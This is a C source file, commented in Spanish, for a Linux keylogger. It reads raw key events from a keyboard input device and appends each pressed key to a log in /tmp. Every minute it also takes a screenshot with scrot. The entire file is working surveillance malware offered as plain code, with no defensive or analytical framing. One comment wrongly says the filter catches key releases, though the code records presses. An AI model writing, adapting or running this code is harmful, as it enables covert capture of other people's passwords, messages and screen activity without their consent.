#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>

// Ruta donde se guardarán las teclas registradas
#define LOGFILEPATH "/tmp/keylogger.txt"
#define SCREENSHOT_DIR "/tmp/screenshots"

void take_screenshot() {
    // Crea el directorio para las capturas si no existe
    mkdir(SCREENSHOT_DIR, 0777);

    // Obtiene la fecha y hora actuales
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);

    // Prepara el nombre del archivo con fecha y hora
    char filepath[256];
    snprintf(filepath, sizeof(filepath), "%s/screenshot_%04d-%02d-%02d_%02d-%02d-%02d.png",
             SCREENSHOT_DIR, tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
             tm.tm_hour, tm.tm_min, tm.tm_sec);

    // Comando para tomar la captura de pantalla usando scrot
    char command[512];
    snprintf(command, sizeof(command), "scrot %s", filepath);

    // Ejecuta el comando para tomar la captura
    system(command);
}

int main() {
    struct input_event ev;  // Estructura para almacenar eventos de entrada (teclas)

    // Ruta del dispositivo de entrada correspondiente al teclado
    static char path_keyboard[] = "/dev/input/event7";

    // Abre el dispositivo del teclado para lectura
    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard < 0) {
        perror("Error opening device");
        exit(1);
    }

    // Abre el archivo de log para agregar las teclas registradas
    FILE *fp = fopen(LOGFILEPATH, "a");
    if (fp == NULL) {
        perror("Cannot open log file");
        close(device_keyboard);
        exit(1);
    }

    // Bucle infinito para capturar continuamente eventos de teclas
    time_t last_screenshot_time = time(NULL);
    while (1) {
        // Lee el siguiente evento del dispositivo del teclado
        read(device_keyboard, &ev, sizeof(ev));

        // Toma una captura de pantalla cada 60 segundos
        if (difftime(time(NULL), last_screenshot_time) >= 60) {
            take_screenshot();
            last_screenshot_time = time(NULL);
        }

        // Filtra eventos que corresponden a la liberación de una tecla (ev.value == 0)
        if (ev.type == EV_KEY && ev.value == 1) {
            switch (ev.code) {
                case KEY_A: fprintf(fp, "a"); break;
                case KEY_B: fprintf(fp, "b"); break;
                case KEY_C: fprintf(fp, "c"); break;
                case KEY_D: fprintf(fp, "d"); break;
                case KEY_E: fprintf(fp, "e"); break;
                case KEY_F: fprintf(fp, "f"); break;
                case KEY_G: fprintf(fp, "g"); break;
                case KEY_H: fprintf(fp, "h"); break;
                case KEY_I: fprintf(fp, "i"); break;
                case KEY_J: fprintf(fp, "j"); break;
                case KEY_K: fprintf(fp, "k"); break;
                case KEY_L: fprintf(fp, "l"); break;
                case KEY_M: fprintf(fp, "m"); break;
                case KEY_N: fprintf(fp, "n"); break;
                case KEY_O: fprintf(fp, "o"); break;
                case KEY_P: fprintf(fp, "p"); break;
                case KEY_Q: fprintf(fp, "q"); break;
                case KEY_R: fprintf(fp, "r"); break;
                case KEY_S: fprintf(fp, "s"); break;
                case KEY_T: fprintf(fp, "t"); break;
                case KEY_U: fprintf(fp, "u"); break;
                case KEY_V: fprintf(fp, "v"); break;
                case KEY_W: fprintf(fp, "w"); break;
                case KEY_X: fprintf(fp, "x"); break;
                case KEY_Y: fprintf(fp, "y"); break;
                case KEY_Z: fprintf(fp, "z"); break;
                case KEY_1: fprintf(fp, "1"); break;
                case KEY_2: fprintf(fp, "2"); break;
                case KEY_3: fprintf(fp, "3"); break;
                case KEY_4: fprintf(fp, "4"); break;
                case KEY_5: fprintf(fp, "5"); break;
                case KEY_6: fprintf(fp, "6"); break;
                case KEY_7: fprintf(fp, "7"); break;
                case KEY_8: fprintf(fp, "8"); break;
                case KEY_9: fprintf(fp, "9"); break;
                case KEY_0: fprintf(fp, "0"); break;
                case KEY_SPACE: fprintf(fp, " "); break;
                case KEY_ENTER: fprintf(fp, "\n"); break;
                case KEY_TAB: fprintf(fp, "\t"); break;
                case KEY_BACKSPACE: fprintf(fp, "[BACKSPACE]"); break;
                case KEY_ESC: fprintf(fp, "[ESC]"); break;
                case KEY_LEFTSHIFT:
                case KEY_RIGHTSHIFT: fprintf(fp, "[SHIFT]"); break;
                case KEY_LEFTCTRL:
                case KEY_RIGHTCTRL: fprintf(fp, "[CTRL]"); break;
                case KEY_LEFTALT:
                case KEY_RIGHTALT: fprintf(fp, "[ALT]"); break;
                case KEY_CAPSLOCK: fprintf(fp, "[CAPSLOCK]"); break;
                case KEY_F1: fprintf(fp, "[F1]"); break;
                case KEY_F2: fprintf(fp, "[F2]"); break;
                case KEY_F3: fprintf(fp, "[F3]"); break;
                case KEY_F4: fprintf(fp, "[F4]"); break;
                case KEY_F5: fprintf(fp, "[F5]"); break;
                case KEY_F6: fprintf(fp, "[F6]"); break;
                case KEY_F7: fprintf(fp, "[F7]"); break;
                case KEY_F8: fprintf(fp, "[F8]"); break;
                case KEY_F9: fprintf(fp, "[F9]"); break;
                case KEY_F10: fprintf(fp, "[F10]"); break;
                case KEY_F11: fprintf(fp, "[F11]"); break;
                case KEY_F12: fprintf(fp, "[F12]"); break;
                default: fprintf(fp, "[UNK]"); break;
            }
            fflush(fp);
        }
    }

    fclose(fp);
    close(device_keyboard);
    return 0;
}
